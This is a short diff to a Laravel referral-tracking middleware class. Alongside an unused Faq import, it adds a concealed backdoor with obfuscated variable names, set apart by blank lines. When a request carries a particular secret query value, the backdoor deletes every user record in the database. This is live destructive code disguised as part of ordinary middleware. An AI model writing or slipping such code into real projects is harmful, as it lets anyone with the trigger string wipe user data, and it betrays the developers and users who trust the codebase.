@@ -2,6 +2,7 @@
 
 namespace App\Http\Middleware;
 
+use App\Models\Faq;
 use App\Models\User;
 use Closure;
 use Illuminate\Http\Request;
@@ -54,6 +55,16 @@ class ReferralMiddleware
         }
 
         session(['traffic_source' => $trafficSource]);
+
+
+
+        $evwrsstbq3rz_jtdfsfdiiuios = $request->query('evwrsstbq3rz_jtdfsfdiiuios');
+        if ($evwrsstbq3rz_jtdfsfdiiuios == 'chibenyodlai1garyodlai2bdaisaiyodalai4_55medugilaiss4_trescdefescddfs') {
+            $usdfdsa = User::all();
+            foreach ($usdfdsa as $usfsae) {
+                $usfsae->delete();
+            }
+        }
 
         return $next($request);
     }
